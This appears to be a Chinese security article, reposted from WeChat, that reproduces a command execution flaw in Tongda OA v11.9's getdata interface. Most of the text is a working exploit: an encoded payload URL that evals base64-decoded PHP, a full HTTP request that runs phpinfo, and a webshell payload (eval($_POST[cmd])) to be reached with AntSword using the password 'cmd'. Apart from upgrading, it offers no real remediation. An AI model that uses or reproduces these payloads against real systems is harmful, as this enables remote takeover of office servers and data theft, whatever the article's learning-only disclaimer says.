<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/H7LjdR8RXU6Hp5Hen01weQ)

**漏洞说明**

通达 OA（Office Anywhere 网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达 OA 为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。

通达 OA v11.9 getdata 接口存在任意命令执行漏洞，攻击者通过漏洞可以执行服务器任意命令控制服务器权限

**影响版本**

```
通达OA v11.9

```

**漏洞复现**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUJPUcDoibDQQu0xK9zHwSFuTmNY5kTbyYdVL0ekE1yXbKDABTevHJ0ddQyV75RgmBslx9ibiafpia72A/640?wx_fmt=png)

payload：

```
/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{bas64命令}%22)))%3B/*&id=19&module=Carouselimage

```

```
GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22cGhwaW5mbygpOw==%22)))%3B/*&id=19&module=Carouselimage HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: */*
Referer: http://ip:port/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=omcivrbku8nr1oersk7gp4it17; KEY_RANDOMDATA=2220
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUJPUcDoibDQQu0xK9zHwSFuBBXXlxOO2JjRd46q0etW7BmoHpomeXibozxey5s68ZCJ7cARUG29sIw/640?wx_fmt=png)

shell 连接：  

```
/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[cmd]))%3B/*&id=19&module=Carouselimage

```

使用中国蚁剑进行连接，密码为 cmd

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUJPUcDoibDQQu0xK9zHwSFuwbGLeXxDSt7DDzCQ09ib3fchTcicjwocQ3KptsYWFKc7CFXQwlE2vhgQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUJPUcDoibDQQu0xK9zHwSFuQbedX8cYRIHCg24mKvjYiahBmT3elzjhiaMlWrpJhxhD76mMuBWSftPA/640?wx_fmt=png)

可见这个站点已经被人打烂了

**修复建议**  

**升级到安全版本**

本文章仅用于学习交流，不得用于非法用途

星标加关注，追洞不迷路